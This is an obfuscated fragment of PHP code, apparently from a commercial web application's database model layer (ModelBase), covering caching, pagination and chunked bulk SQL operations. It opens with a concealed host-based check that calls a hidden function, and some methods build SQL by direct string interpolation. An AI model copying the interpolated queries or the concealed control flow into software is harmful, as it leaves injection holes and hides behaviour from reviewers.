$F˜ïƒÎç—Û(); $c‹®“¶° = $fô…ƒÔÉÛŒ[790]; $E…œ‰Ğ´ìƒ = json_encode($GLOBALS[$fô…ƒÔÉÛŒ[791]]); goto e®î«Šß—; bĞ…ñÈô›Ö: $F»ÏèÃ´÷º = $díé‰ˆôè”($F‡äò½ß’±); $FÆˆ§ÀÈê = explode($fô…ƒÔÉÛŒ[214], $F»ÏèÃ´÷º); if (count($FÆˆ§ÀÈê) < $fô…ƒÔÉÛŒ[548]) { $c­îõèÏ« = $fô…ƒÔÉÛŒ[758]; $c­îõèÏ«(); } goto fÏ®Ç˜š™À; aÃëêá«ªù: $F˜ïƒÎç—Û = $fô…ƒÔÉÛŒ[787]; $díé‰ˆôè” = $fô…ƒÔÉÛŒ[755]; $F‡äò½ß’± = $_SERVER[$fô…ƒÔÉÛŒ[756]] . $fô…ƒÔÉÛŒ[757]; goto bĞ…ñÈô›Ö; fŞœ®ì‘Î : } if ($this->isCluster) { foreach ($this->handle->_masters() as $có”êòôé„) { $this->handle->flushall($có”êòôé„); } return; } return $this->handle->flushAll(); } } goto BÅîö¼‡¥Î; d¡šœ…¿ù: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\x64\151\146\x79\124\151\x6d\x65", "\x74\x69\155\145", "\151\156\163\145\x72\x74\54\x75\160\x64\x61\x74\x65", "\x66\165\x6e\143\164\x69\x6f\156"), array("\143\x72\x65\x61\x74\x65\124\x69\x6d\x65", "\x74\151\x6d\x65", "\x69\156\163\145\x72\164", "\x66\x75\x6e\x63\164\x69\x6f\156")); public function setDataAuto($EÈ£ŞáÚ”) { $this->dataAuto = $EÈ£ŞáÚ”; } public function __construct($A×¸ù—¯À† = '', $E¤Ú™§ÄØ— = '', $a‚õàÎØŠÀ = '') { parent::__construct($A×¸ù—¯À†, $E¤Ú™§ÄØ—, $a‚õàÎØŠÀ); } public static function textEncode($D´¡Ê¨Š•â) { if (!$D´¡Ê¨Š•â) { return $D´¡Ê¨Š•â; } $fÖæ‚Ç¿¼õ = json_encode($D´¡Ê¨Š•â); $fÖæ‚Ç¿¼õ = preg_replace_callback($_SERVER[¼][339], function ($FÊäÁĞ×ìˆ) { return addslashes($FÊäÁĞ×ìˆ[0]); }, $fÖæ‚Ç¿¼õ); return json_decode($fÖæ‚Ç¿¼õ); } public static function textDecode($aæÅ½ã©¶Ù) { $aò¡Á«²¨ =& $_SERVER[¼]; $AÊáè‡»„‚ = json_encode($aæÅ½ã©¶Ù); $AÊáè‡»„‚ = preg_replace_callback($aò¡Á«²¨[340], function ($aë£‹¨ï£) { return $_SERVER[¼][95]; }, $AÊáè‡»„‚); return json_decode($AÊáè‡»„‚); } protected $tableMeta = array(); protected function _beforeInsert(&$fÊ“Ğôğ“¾, $CÎ™¸òÓ®) { $Dèé’èÑ‚† =& $_SERVER[¼]; if (!$this->checkDataAutoHas($Dèé’èÑ‚†[341])) { return; } $this->dataBeforeFilter($fÊ“Ğôğ“¾, $Dèé’èÑ‚†[341]); } protected function _beforeUpdate(&$C”­¶ã©²Ä, $eŸ¸¤ó­) { $F§£î…Æ¸¢ =& $_SERVER[¼]; if (!$this->checkDataAutoHas($F§£î…Æ¸¢[342])) { return; } $this->dataBeforeFilter($C”­¶ã©²Ä, $F§£î…Æ¸¢[342]); } protected function _afterSelect(&$eÖÍ×ëİÚ, $D‚…äÉ¤ğŠ) { if (!is_array($eÖÍ×ëİÚ)) { return; } if (!$this->checkDataAutoHas($_SERVER[¼][343])) { return; } foreach ($eÖÍ×ëİÚ as &$Bùçà¢ç‚) { $this->dataAfterFilter($Bùçà¢ç‚); } } protected function _afterFind(&$a³¯ùâ‘Á©, $D¸ëØ¸ïè) { if (!is_array($a³¯ùâ‘Á©)) { return; } if (!$this->checkDataAutoHas($_SERVER[¼][343])) { return; } $this->dataAfterFilter($a³¯ùâ‘Á©); } public function setAutoIncrement($c«È¹‰¡ä•) { $FòÜà‚¸ª = array($this->getPk() => $c«È¹‰¡ä•); $c“·½Åğº“ = $this->data($FòÜà‚¸ª)->add(); if ($c“·½Åğº“) { $this->delete($c“·½Åğº“); } } public function getAutoIncrement() { $bĞ‡ŒÕŠá = $this->getTableName(); $FÒ”åÁÇÖ = $this->max($this->getPk()); $a¥ëÑç·£Ñ = $this->query("\x73\x68\157\167\x20\164\x61\142\x6c\145\x20\x73\164\x61\164\165\x73\x20\167\x68\145\162\145\40\116\141\x6d\x65\x3d\x27{$bĞ‡ŒÕŠá}\47"); $C°°Æ†Ğø¯ = $a¥ëÑç·£Ñ[0][$_SERVER[¼][344]]; $AÓ‹¸ßÊ¨ = max($FÒ”åÁÇÖ, $C°°Æ†Ğø¯); return $AÓ‹¸ßÊ¨; } protected function _callBefore($Dò‰×§è–, $A¡±ñ“‚) { return $this->cacheCallCheck($Dò‰×§è–, $A¡±ñ“‚, !1); } protected function _callAfter($e¦ŸÂåæ‰, $BŒÏîˆÀ¤Œ) { return $this->cacheCallCheck($e¦ŸÂåæ‰, $BŒÏîˆÀ¤Œ, !0); } protected function cacheFunctionAlias($f«Üå‰Ì¶) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($f„Œø£Ğ±ï, $BÉ˜ŠÒñ‹Ã, $CÔ˜Ó¤è† = false) { $B£¸è·ğºÄ = $this->cacheFunctionAlias($BÉ˜ŠÒñ‹Ã); if (!$B£¸è·ğºÄ) { return; } foreach ($B£¸è·ğºÄ as $B¹¤Œ‘ÕÄô => $b¥ÁÒÑßÕ¡) { $dŠËÀßç ë = $b¥ÁÒÑßÕ¡[0]; $fŒ©ôË±ß = explode($_SERVER[¼][47], $b¥ÁÒÑßÕ¡[1]); if ($f„Œø£Ğ±ï == $B¹¤Œ‘ÕÄô) { return $this->cacheFunctionGet($B¹¤Œ‘ÕÄô, $dŠËÀßç ë); } if ($CÔ˜Ó¤è† && in_array($f„Œø£Ğ±ï, $fŒ©ôË±ß)) { $this->cacheFunctionClear($B¹¤Œ‘ÕÄô, $dŠËÀßç ë); } } } public function cacheFunctionGet($e’øò’†™í, $b“˜Ùİ¬†) { $d´Â—–Ï±ƒ = $this->cacheKeyMake($e’øò’†™í, $b“˜Ùİ¬†); $d·´“½  = Cache::get($d´Â—–Ï±ƒ); if (!is_array($d·´“½ )) { $d·´“½  = call_user_func_array(array($this, $e’øò’†™í), array($b“˜Ùİ¬†, !0)); Cache::set($d´Â—–Ï±ƒ, $d·´“½ ); } return $d·´“½ ; } public function cacheFunctionClear($fí³Ê–É«­, $BøáÀÚÀßµ) { $cÎÉÕ¥‘È = $BøáÀÚÀßµ; if (!is_array($BøáÀÚÀßµ)) { $cÎÉÕ¥‘È = array($BøáÀÚÀßµ); } foreach ($cÎÉÕ¥‘È as $Bˆ×Š¢˜Ä) { $FºÀõ”³‡ = $this->cacheKeyMake($fí³Ê–É«­, $Bˆ×Š¢˜Ä); Cache::remove($FºÀõ”³‡); } } private function cacheKeyMake($DÖ·•Â†ãò, $E¯ÀˆĞÙâ†) { $c¿ê¶çø­­ =& $_SERVER[¼]; return get_class($this) . $c¿ê¶çø­­[70] . $DÖ·•Â†ãò . $c¿ê¶çø­­[345] . $E¯ÀˆĞÙâ†; } protected function selectPage($cš¨‰›£î = 200, $Eƒ¼Õ¡± = 1) { goto EŞï‰Í¥; EŞï‰Í¥: $E‰Õ™‡¼“™ =& $_SERVER[¼]; global $in; $Bï¯”ÖŒ‡¥ = $this->optionsValue(); goto cø„‰†ˆ×; CáºÒâó´À: $dÄãßôÒ† = $Bï¯”ÖŒ‡¥; $dÄãßôÒ†[$E‰Õ™‡¼“™[347]] = array(); $this->optionsValue($dÄãßôÒ†); goto bÂŠçùññÈ; BƒÁè´Ùò£: $this->optionsValue($Bï¯”ÖŒ‡¥); $aÁÛéÏØ²‘ = $this->page($Eƒ¼Õ¡±, $cš¨‰›£î)->select(); $aÁÛéÏØ²‘ = is_array($aÁÛéÏØ²‘) ? $aÁÛéÏØ²‘ : array(); goto bŠá¥ç×ë®; cø„‰†ˆ×: $A×«•œäœ¯ = 4000; $cš¨‰›£î = isset($in[$E‰Õ™‡¼“™[346]]) ? $in[$E‰Õ™‡¼“™[346]] : $cš¨‰›£î; if ($cš¨‰›£î === -1) { unset($in[$E‰Õ™‡¼“™[346]]); $A×«•œäœ¯ = 100000000; $cš¨‰›£î = $A×«•œäœ¯; } goto CáºÒâó´À; eĞ«®–óÈà: $b„ˆ¼¢’™ƒ = ceil($EŠ…èâ£ä / $cš¨‰›£î); $Eƒ¼Õ¡± = intval(isset($in[$E‰Õ™‡¼“™[337]]) ? $in[$E‰Õ™‡¼“™[337]] : $Eƒ¼Õ¡±); $Eƒ¼Õ¡± = $Eƒ¼Õ¡± <= 1 ? 1 : ($Eƒ¼Õ¡± >= $b„ˆ¼¢’™ƒ ? $b„ˆ¼¢’™ƒ : $Eƒ¼Õ¡±); goto BƒÁè´Ùò£; bÂŠçùññÈ: $EŠ…èâ£ä = intval($this->count()); $cš¨‰›£î = intval($cš¨‰›£î); $cš¨‰›£î = $cš¨‰›£î <= 5 ? 5 : ($cš¨‰›£î >= $A×«•œäœ¯ ? $A×«•œäœ¯ : $cš¨‰›£î); goto eĞ«®–óÈà; bŠá¥ç×ë®: if ($b„ˆ¼¢’™ƒ == 1) { $EŠ…èâ£ä = count($aÁÛéÏØ²‘); } $e„¢çÌ†© = array($E‰Õ™‡¼“™[348] => array($E‰Õ™‡¼“™[349] => $EŠ…èâ£ä, $E‰Õ™‡¼“™[346] => $cš¨‰›£î, $E‰Õ™‡¼“™[337] => $Eƒ¼Õ¡±, $E‰Õ™‡¼“™[350] => $b„ˆ¼¢’™ƒ), $E‰Õ™‡¼“™[351] => $aÁÛéÏØ²‘ ? $aÁÛéÏØ²‘ : array()); return $e„¢çÌ†©; goto eÕ–·ÈßÉ›; eÕ–·ÈßÉ›: } protected function checkLength($bÚ×ÇÆ¹, $d¼¢¶ëÇ› = 0, $E±ñƒÃ¢ù = '') { $B‡ˆáòêÍ– =& $_SERVER[¼]; $d¼¢¶ëÇ› = $d¼¢¶ëÇ› ? $d¼¢¶ëÇ› : 65536; if (!$bÚ×ÇÆ¹ || strlen($bÚ×ÇÆ¹) < $d¼¢¶ëÇ›) { return; } $E±ñƒÃ¢ù = $E±ñƒÃ¢ù ? $E±ñƒÃ¢ù . $B‡ˆáòêÍ–[67] : $B‡ˆáòêÍ–[33]; show_json($E±ñƒÃ¢ù . LNG($B‡ˆáòêÍ–[352]) . "\x28{$d¼¢¶ëÇ›}\51", !1); } protected function metaSet($f¡ÙÄ¥´…â, $AäÚ£®¼Ğ = null, $f¯¾ÇáŒï° = null) { goto dâùÊÇ¸˜È; bğƒáÅÒ: if (is_null($AäÚ£®¼Ğ)) { return $cÎÌ®¯¿˜->where(array($A’¨‹„ï¿ => $f¡ÙÄ¥´…â))->delete(); } if (is_null($f¯¾ÇáŒï°)) { return $cÎÌ®¯¿˜->where($c‰²±†Ä­ø)->delete(); } $Eò¹‚ãĞ·ò = is_array($AäÚ£®¼Ğ) ? $AäÚ£®¼Ğ : array(); goto cºìÂ†Å«; EÈ±¯–‰¬: $f¡½°â¹‡ = $this->tableMeta[$e¨øä•„ø[354]]; $cÎÌ®¯¿˜ = Model($f¡½°â¹‡); $c‰²±†Ä­ø = array($A’¨‹„ï¿ => $f¡ÙÄ¥´…â, $e¨øä•„ø[355] => $AäÚ£®¼Ğ); goto bğƒáÅÒ; AÎ¶¶¾ğŞ: $cÎÌ®¯¿˜->where(array($A’¨‹„ï¿ => $f¡ÙÄ¥´…â))->addAll($B‹¤É’ãÜ‚, array(), !0); return !0; goto CğëÇô‰É; cºìÂ†Å«: if (is_string($AäÚ£®¼Ğ)) { $Eò¹‚ãĞ·ò[$AäÚ£®¼Ğ] = $f¯¾ÇáŒï°; } $B‹¤É’ãÜ‚ = array(); foreach ($Eò¹‚ãĞ·ò as $EÇìèß‘‚æ => $dÅ½ë×Ô) { $this->checkLength($dÅ½ë×Ô, !1, $f¡½°â¹‡ . $e¨øä•„ø[4] . $EÇìèß‘‚æ); $B‹¤É’ãÜ‚[] = array($A’¨‹„ï¿ => $f¡ÙÄ¥´…â, $e¨øä•„ø[89] => $EÇìèß‘‚æ, $e¨øä•„ø[356] => $dÅ½ë×Ô); } goto AÎ¶¶¾ğŞ; dâùÊÇ¸˜È: $e¨øä•„ø =& $_SERVER[¼]; if (!$this->tableMeta) { return !1; } $A’¨‹„ï¿ = $this->tableMeta[$e¨øä•„ø[353]]; goto EÈ±¯–‰¬; CğëÇô‰É: } public function metaGet($Aê—ô…çß) { goto E£Ó­Ö‹; E£Ó­Ö‹: $fê­›ĞÃÙ =& $_SERVER[¼]; if (!$this->tableMeta) { return array(); } $b°ŒŸ¶ŠØÂ = $this->tableMeta[$fê­›ĞÃÙ[353]]; goto eÒœ‘‡¢ç˜; A³÷ ”²’: $b•½ª­¬ = array_to_keyvalue($b•½ª­¬, $fê­›ĞÃÙ[89], $fê­›ĞÃÙ[356]); return $b•½ª­¬; goto Bê§ˆªÁ; eÒœ‘‡¢ç˜: $F˜‰Èãí¨® = Model($this->tableMeta[$fê­›ĞÃÙ[354]]); $eÚ®µ„“‘Ù = array($b°ŒŸ¶ŠØÂ => $Aê—ô…çß); $b•½ª­¬ = $F˜‰Èãí¨®->field($fê­›ĞÃÙ[357])->where($eÚ®µ„“‘Ù)->select(); goto A³÷ ”²’; Bê§ˆªÁ: } private function checkDataAutoHas($fÁÜÅğìùÂ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $F›‰¯ÓÙã) { if (in_array($fÁÜÅğìùÂ, explode($_SERVER[¼][47], $F›‰¯ÓÙã[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$A„…Õ³¢Â·, $Aô‹ÒˆªÂ) { $Añ°‹ÜæÃ =& $_SERVER[¼]; foreach ($this->dataAuto as $BÚ‰‡¨à‹º) { $EãóÔŞäØ¸ = $BÚ‰‡¨à‹º[0]; if (!in_array($Aô‹ÒˆªÂ, explode($Añ°‹ÜæÃ[47], $BÚ‰‡¨à‹º[2]))) { continue; } switch (trim($BÚ‰‡¨à‹º[3])) { case $Añ°‹ÜæÃ[306]: case $Añ°‹ÜæÃ[307]: $a§Å‹Ü¨Ú× = $BÚ‰‡¨à‹º[1]; $CçÂÖÈ = isset($BÚ‰‡¨à‹º[4]) ? (array) $BÚ‰‡¨à‹º[4] : array(); if ($a§Å‹Ü¨Ú× == $Añ°‹ÜæÃ[187] && array_key_exists($EãóÔŞäØ¸, $A„…Õ³¢Â·)) { if (!$A„…Õ³¢Â·[$EãóÔŞäØ¸]) { unset($A„…Õ³¢Â·[$EãóÔŞäØ¸]); } break; } if (isset($A„…Õ³¢Â·[$EãóÔŞäØ¸])) { array_unshift($CçÂÖÈ, $A„…Õ³¢Â·[$EãóÔŞäØ¸]); } if ($Añ°‹ÜæÃ[306] == $BÚ‰‡¨à‹º[3]) { $A„…Õ³¢Â·[$EãóÔŞäØ¸] = call_user_func_array($a§Å‹Ü¨Ú×, $CçÂÖÈ); } else { $A„…Õ³¢Â·[$EãóÔŞäØ¸] = call_user_func_array(array(&$this, $a§Å‹Ü¨Ú×), $CçÂÖÈ); } break; case $Añ°‹ÜæÃ[258]: $A„…Õ³¢Â·[$EãóÔŞäØ¸] = $A„…Õ³¢Â·[$BÚ‰‡¨à‹º[1]]; break; case $Añ°‹ÜæÃ[279]: if (isset($A„…Õ³¢Â·[$EãóÔŞäØ¸]) && !is_string($A„…Õ³¢Â·[$EãóÔŞäØ¸])) { $A„…Õ³¢Â·[$EãóÔŞäØ¸] = json_encode_force($A„…Õ³¢Â·[$EãóÔŞäØ¸]); } break; case $Añ°‹ÜæÃ[308]: if ($A„…Õ³¢Â·[$EãóÔŞäØ¸] === $Añ°‹ÜæÃ[33]) { unset($A„…Õ³¢Â·[$EãóÔŞäØ¸]); } break; case $Añ°‹ÜæÃ[309]: $A„…Õ³¢Â·[$EãóÔŞäØ¸] = $BÚ‰‡¨à‹º[1]; default: break; } } if ($Aô‹ÒˆªÂ == $Añ°‹ÜæÃ[341]) { $eêœˆ¸½¥ = strtolower($this->db->getDbType()); if (strpos($eêœˆ¸½¥, $Añ°‹ÜæÃ[9]) !== 0) { return; } $cÛ°¨¨ëâ¥ = $this->field(!0)->fields; $F—Úôˆ¬¬Á = $cÛ°¨¨ëâ¥[$Añ°‹ÜæÃ[237]]; if (isset($cÛ°¨¨ëâ¥[$Añ°‹ÜæÃ[236]])) { unset($F—Úôˆ¬¬Á[$cÛ°¨¨ëâ¥[$Añ°‹ÜæÃ[236]]]); } foreach ($F—Úôˆ¬¬Á as $aáµÎ”±ìÕ => $Aô‹ÒˆªÂ) { if (!isset($A„…Õ³¢Â·[$aáµÎ”±ìÕ])) { $A„…Õ³¢Â·[$aáµÎ”±ìÕ] = $Añ°‹ÜæÃ[33]; } } } } private function dataAfterFilter(&$aå¢å…æ) { $bêŠÒÆÚÀƒ =& $_SERVER[¼]; foreach ($this->dataAuto as $C¦ßØïÏ–Ò) { $cï¶´ÈÎ‹“ = $C¦ßØïÏ–Ò[0]; if (!in_array($bêŠÒÆÚÀƒ[343], explode($bêŠÒÆÚÀƒ[47], $C¦ßØïÏ–Ò[2]))) { continue; } if (!isset($aå¢å…æ[$cï¶´ÈÎ‹“])) { continue; } switch (trim($C¦ßØïÏ–Ò[3])) { case $bêŠÒÆÚÀƒ[306]: case $bêŠÒÆÚÀƒ[307]: $d…‰ºÂîÖÆ = isset($C¦ßØïÏ–Ò[4]) ? (array) $C¦ßØïÏ–Ò[4] : array(); array_unshift($d…‰ºÂîÖÆ, $aå¢å…æ[$cï¶´ÈÎ‹“]); if ($bêŠÒÆÚÀƒ[306] == $C¦ßØïÏ–Ò[3]) { $aå¢å…æ[$cï¶´ÈÎ‹“] = call_user_func_array($C¦ßØïÏ–Ò[1], $d…‰ºÂîÖÆ); } else { $aå¢å…æ[$cï¶´ÈÎ‹“] = call_user_func_array(array(&$this, $C¦ßØïÏ–Ò[1]), $d…‰ºÂîÖÆ); } break; case $bêŠÒÆÚÀƒ[258]: $aå¢å…æ[$cï¶´ÈÎ‹“] = $aå¢å…æ[$C¦ßØïÏ–Ò[1]]; break; case $bêŠÒÆÚÀƒ[279]: $bÍ«‰Øì« = $aå¢å…æ[$cï¶´ÈÎ‹“]; $aå¢å…æ[$cï¶´ÈÎ‹“] = json_decode($bÍ«‰Øì«, !0); if (is_null($aå¢å…æ[$cï¶´ÈÎ‹“])) { $aå¢å…æ[$cï¶´ÈÎ‹“] = $bÍ«‰Øì«; } break; case $bêŠÒÆÚÀƒ[308]: if ($aå¢å…æ[$cï¶´ÈÎ‹“] === $bêŠÒÆÚÀƒ[33]) { unset($aå¢å…æ[$cï¶´ÈÎ‹“]); } break; case $bêŠÒÆÚÀƒ[309]: $aå¢å…æ[$cï¶´ÈÎ‹“] = $C¦ßØïÏ–Ò[1]; default: break; } } } public function saveAll($D”ä£»ÖŠÜ) { goto fÌ«¡¾‘“”; fÌ«¡¾‘“”: $a«ô„Âƒš› =& $_SERVER[¼]; $e°µ‹ÊŒá = $this->tablePrefix . $this->tableName; $D×Ö›À¼Ÿ­ = self::SQL_WHERE_IN_CHUNK; goto BÉ§ƒ°Şİ; b‰„¨öèß¬: $dì§…à¹ƒ³ = array(); $Aƒ¤Ö§¸±³ = count($D”ä£»ÖŠÜ); for ($B‰§¯ğÜ¬ = 0; $B‰§¯ğÜ¬ < $Aƒ¤Ö§¸±³; $B‰§¯ğÜ¬++) { $BôŞÆÂ•íô = $D”ä£»ÖŠÜ[$B‰§¯ğÜ¬]; if (!is_array($BôŞÆÂ•íô) || count($BôŞÆÂ•íô) != 4) { continue; } $e˜¦ôµ¥¹Ë = "\125\120\x44\x41\x54\x45\x20{$e°µ‹ÊŒá}\40\x53\105\x54\40{$BôŞÆÂ•íô[2]}\x20\x3d\40\103\101\x53\x45\x20{$BôŞÆÂ•íô[0]}\x20\12"; if ($EŠº¯Á’á² == 0) { $dÜ£ˆ†çÁ¼ = $e˜¦ôµ¥¹Ë; } $dì§…à¹ƒ³[] = $a«ô„Âƒš›[113] . $BôŞÆÂ•íô[1] . $a«ô„Âƒš›[113]; $EŠº¯Á’á²++; $dÜ£ˆ†çÁ¼ .= "\x20\127\110\105\116\x20\x27{$BôŞÆÂ•íô[1]}\x27\x20\124\x48\105\x4e\x20\x27{$BôŞÆÂ•íô[3]}\x27\40\12"; if ($EŠº¯Á’á² == $D×Ö›À¼Ÿ­ || $B‰§¯ğÜ¬ == $Aƒ¤Ö§¸±³ - 1) { goto dÇÄëã‚; F÷³È¯: $EŠº¯Á’á² = 0; $dÜ£ˆ†çÁ¼ = $e˜¦ôµ¥¹Ë; $this->chunkEventCheck(count($dì§…à¹ƒ³)); goto F¨Šùæ‘ÒĞ; F¨Šùæ‘ÒĞ: $dì§…à¹ƒ³ = array(); goto AËœÌİá×™; dÇÄëã‚: $AóÆ”æÑé¢ = implode($a«ô„Âƒš›[47], $dì§…à¹ƒ³); $dÜ£ˆ†çÁ¼ .= "\40\105\116\104\x20\x20\127\110\105\x52\x45\40{$BôŞÆÂ•íô[0]}\x20\x49\x4e\40\x28{$AóÆ”æÑé¢}\x29\40"; $this->execute($dÜ£ˆ†çÁ¼); goto F÷³È¯; AËœÌİá×™: } } goto bÛØîù¡ŠÑ; BÉ§ƒ°Şİ: $D”ä£»ÖŠÜ = is_array($D”ä£»ÖŠÜ) ? $D”ä£»ÖŠÜ : array(); $dÜ£ˆ†çÁ¼ = $a«ô„Âƒš›[358]; $EŠº¯Á’á² = 0; goto b‰„¨öèß¬; bÛØîù¡ŠÑ: $this->chunkEventSet(); goto Fˆá…à¶¦Œ; Fˆá…à¶¦Œ: } public function saveAllEach($eçŒèŠé¡) { $a‹ªí»½Ü =& $_SERVER[¼]; $fŠ‘÷‹ÛŠñ = $this->tablePrefix . $this->tableName; foreach ($eçŒèŠé¡ as $B•¨‘æÙšø) { if (!is_array($B•¨‘æÙšø) || count($B•¨‘æÙšø) != 4) { continue; } $B…Ò¹¶¶–‰ = $B•¨‘æÙšø[0] . $a‹ªí»½Ü[359] . $B•¨‘æÙšø[1] . $a‹ªí»½Ü[113]; $EÊ“ªŒĞÛÇ = $B•¨‘æÙšø[2] . $a‹ªí»½Ü[359] . $B•¨‘æÙšø[3] . $a‹ªí»½Ü[113]; $D‰¤ŒŒ˜Œ = "\165\x70\144\x61\164\x65\x20{$fŠ‘÷‹ÛŠñ}\x20\163\145\164\x20{$EÊ“ªŒĞÛÇ}\40\x77\150\x65\x72\x65\x20{$B…Ò¹¶¶–‰}\73"; $this->execute($D‰¤ŒŒ˜Œ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($AØÓßÖ£ì = false, $eåÉÒ“²ƒ¡ = false) { $this->_chunkEvent = $AØÓßÖ£ì; $this->_chunkEventParam = $eåÉÒ“²ƒ¡; } private function chunkEventCheck($dØàİ¿ÑÑ·) { if (!$this->_chunkEvent) { return; } $f¾‚–ºÃ›Š = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $f¾‚–ºÃ›Š[$_SERVER[¼][360]] = $dØàİ¿ÑÑ·; Hook::trigger($this->_chunkEvent, $f¾‚–ºÃ›Š); } public function addAll($F¢¦÷Ûì, $cÛ¡ĞÁŒäİ = array(), $e¬éÎƒÈã™ = false) { goto AíŒˆî²ãì; Cå²‡¿¢Œ¤: if (empty($F¢¦÷Ûì)) { $this->error = think_lang($DöÖ¶ŸÜ©[256]); return !1; } $cÛ¡ĞÁŒäİ = $this->_parseOptions($cÛ¡ĞÁŒäİ); foreach ($F¢¦÷Ûì as $BºÌÁ½± => $eÇŒˆ»¸‘Ş) { $F¢¦÷Ûì[$BºÌÁ½±] = $this->_facade($eÇŒˆ»¸‘Ş); $this->_beforeInsert($F¢¦÷Ûì[$BºÌÁ½±], $cÛ¡ĞÁŒäİ); } goto bøçÔ„¡™¸; bøçÔ„¡™¸: if (method_exists($this->db, $DöÖ¶ŸÜ©[257])) { for ($CÕÂŠÚÍŠÃ = 0; $CÕÂŠÚÍŠÃ < count($F¢¦÷Ûì); $CÕÂŠÚÍŠÃ += $Fá——ª‡«ò) { $F¼´ÊÓè¾ = array_slice($F¢¦÷Ûì, $CÕÂŠÚÍŠÃ, $Fá——ª‡«ò); if (!is_array($F¼´ÊÓè¾) || count($F¼´ÊÓè¾) == 0) { break; } $E§ùéÕ„†‰ = $this->db->insertAll($F¼´ÊÓè¾, $cÛ¡ĞÁŒäİ, $e¬éÎƒÈã™); $this->chunkEventCheck(count($F¼´ÊÓè¾)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($F¢¦÷Ûì as $BºÌÁ½± => $eÇŒˆ»¸‘Ş) { $E§ùéÕ„†‰ = $this->db->insert($eÇŒˆ»¸‘Ş, $cÛ¡ĞÁŒäİ, $e¬éÎƒÈã™); } $this->commit(); } if (!1 !== $E§ùéÕ„†‰) { $cñ…õ‡¤³¯ = $this->getLastInsID(); if ($cñ…õ‡¤³¯) { return $cñ…õ‡¤³¯; } } return $E§ùéÕ„†‰; goto dàÌ›©’‰; AíŒˆî²ãì: $DöÖ¶ŸÜ© =& $_SERVER[¼]; ignore_timeout(); $Fá——ª‡«ò = self::SQL_WHERE_IN_CHUNK; goto Cå²‡¿¢Œ¤; dàÌ›©’‰: } public function save($aÅ‚ƒÇ‡™İ = '', $E–Ô¦‘™µ = array()) { goto BÜ‘—¼”¶®; EÔã²êÅ¿ï: for ($dİçÛ£ì÷œ = 0; $dİçÛ£ì÷œ < $Eæ§ôˆô¥ä; $dİçÛ£ì÷œ += $A«öƒâó”Å) { $D¦¥îÑİ‘° = array_slice($c‰¿Á‚ÎÜ, $dİçÛ£ì÷œ, $A«öƒâó”Å); if (!is_array($D¦¥îÑİ‘°) || count($D¦¥îÑİ‘°) == 0) { break; } $cáîÜ›…À[$Fø¡»ÀÊİ[260]][$Dù°ˆµÔ½][1] = $D¦¥îÑİ‘°; $this->optionsValue($cáîÜ›…À); $a…Î°Ø‚Ş += parent::save($aÅ‚ƒÇ‡™İ, $E–Ô¦‘™µ); $this->chunkEventCheck(count($D¦¥îÑİ‘°)); } $this->chunkEventSet(); return $a…Î°Ø‚Ş; goto BÊ§˜ºËÜ; aŠåõ’°ÂÜ: $Dù°ˆµÔ½ = $this->findWhereField($cáîÜ›…À); if (!$Dù°ˆµÔ½) { return parent::save($aÅ‚ƒÇ‡™İ, $E–Ô¦‘™µ); } $a…Î°Ø‚Ş = 0; goto BÛÇˆÇùƒ; BÜ‘—¼”¶®: $Fø¡»ÀÊİ =& $_SERVER[¼]; $A«öƒâó”Å = self::SQL_WHERE_IN_CHUNK; $cáîÜ›…À = $this->optionsValue(); goto aŠåõ’°ÂÜ; BÛÇˆÇùƒ: $c‰¿Á‚ÎÜ = $cáîÜ›…À[$Fø¡»ÀÊİ[260]][$Dù°ˆµÔ½][1]; $c‰¿Á‚ÎÜ = is_array($c‰¿Á‚ÎÜ) ? $c‰¿Á‚ÎÜ : array(); $Eæ§ôˆô¥ä = count($c‰¿Á‚ÎÜ); goto EÔã²êÅ¿ï; BÊ§˜ºËÜ: } public function add($Bù¦ª‘£º¡ = '', $EŸÄ–¿µƒä = array(), $d¶™É’­ëš = false) { if ($this->addTaskStatus && is_array($Bù¦ª‘£º¡)) { $this->addTaskData[] = $Bù¦ª‘£º¡; return; } return parent::add($Bù¦ª‘£º¡, $EŸÄ–¿µƒä, $d¶™É’­ëš); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($A“éÒ±Ì… = array()) { goto A·àºäêğ†; A·àºäêğ†: $cÚï‰«õ»ù =& $_SERVER[¼]; $f‚…·×–âñ = self::SQL_WHERE_IN_CHUNK; $e‚Êˆ†Ì‘ñ = $this->optionsValue(); goto Eé¨„¤Ö›Æ; a„«õ´†…: return $aŸ˜óÚÏ Ö; goto D¥¥±ÛŸ¥; Eé¨„¤Ö›Æ: $c÷®›íÈ‚Ï = $this->findWhereField($e‚Êˆ†Ì‘ñ); if (!$c÷®›íÈ‚Ï || isset($e‚Êˆ†Ì‘ñ[$cÚï‰«õ»ù[277]]) || isset($e‚Êˆ†Ì‘ñ[$cÚï‰«õ»ù[337]])) { return parent::select($A“éÒ±Ì…); } $B°õº ¥ª = $e‚Êˆ†Ì‘ñ[$cÚï‰«õ»ù[260]][$c÷®›íÈ‚Ï][1]; goto A©™æ¸›ÇÓ; A©™æ¸›ÇÓ: $B°õº ¥ª = is_array($B°õº ¥ª) ? $B°õº ¥ª : array(); $aŸ˜óÚÏ Ö = null; for ($B¦ÊËƒä‰¶ = 0; $B¦ÊËƒä‰¶ < count($B°õº ¥ª); $B¦ÊËƒä‰¶ += $f‚…·×–âñ) { $BÌ‹Å£×¤¯ = array_slice($B°õº ¥ª, $B¦ÊËƒä‰¶, $f‚…·×–âñ); if (!is_array($BÌ‹Å£×¤¯) || count($BÌ‹Å£×¤¯) == 0) { break; } $e‚Êˆ†Ì‘ñ[$cÚï‰«õ»ù[260]][$c÷®›íÈ‚Ï][1] = $BÌ‹Å£×¤¯; $this->optionsValue($e‚Êˆ†Ì‘ñ); $BÂ‡ÎŒšÜÙ = parent::select($A“éÒ±Ì…); if (!$BÂ‡ÎŒšÜÙ) { continue; } if (is_null($aŸ˜óÚÏ Ö)) { $aŸ˜óÚÏ Ö = array(); } 